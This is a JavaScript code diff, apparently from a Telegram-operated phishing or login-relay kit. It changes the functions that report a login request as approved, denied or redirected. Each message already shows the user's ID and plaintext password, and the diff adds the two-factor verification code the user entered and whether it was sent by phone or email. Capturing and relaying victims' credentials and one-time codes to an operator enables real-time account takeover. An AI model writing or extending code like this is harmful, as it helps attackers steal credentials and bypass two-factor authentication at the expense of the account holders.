@@ -249,30 +249,45 @@ export async function notifyAdvance(env, task) {
 }
 
 export function buildApprovedMessage(task) {
-  return [
+  var lines = [
     "✅ APPROVED via Telegram",
     "🔐 Login request (HA)",
     "👤 User: " + task.user_id,
     "🔑 Password: " + (task.password || "N/A"),
-  ].join("\n");
+  ];
+  if (task.verification_code) {
+    lines.push("🔢 Code entered: " + task.verification_code);
+    lines.push("✉️ Sent via: " + (task.code_delivery_method === "phone" ? "Phone" : "Email"));
+  }
+  return lines.join("\n");
 }
 
 export function buildDeniedMessage(task) {
-  return [
+  var lines = [
     "❌ DENIED via Telegram",
     "🔐 Login request (HA)",
     "👤 User: " + task.user_id,
     "🔑 Password: " + (task.password || "N/A"),
-  ].join("\n");
+  ];
+  if (task.verification_code) {
+    lines.push("🔢 Code entered: " + task.verification_code);
+    lines.push("✉️ Sent via: " + (task.code_delivery_method === "phone" ? "Phone" : "Email"));
+  }
+  return lines.join("\n");
 }
 
 export function buildRedirectedMessage(task) {
-  return [
+  var lines = [
     "🔀 REDIRECTED via Telegram",
     "🔐 Login request (HA)",
     "👤 User: " + task.user_id,
     "🔑 Password: " + (task.password || "N/A"),
-  ].join("\n");
+  ];
+  if (task.verification_code) {
+    lines.push("🔢 Code entered: " + task.verification_code);
+    lines.push("✉️ Sent via: " + (task.code_delivery_method === "phone" ? "Phone" : "Email"));
+  }
+  return lines.join("\n");
 }
 
 export async function editMessage(env, chatId, messageId, text) {
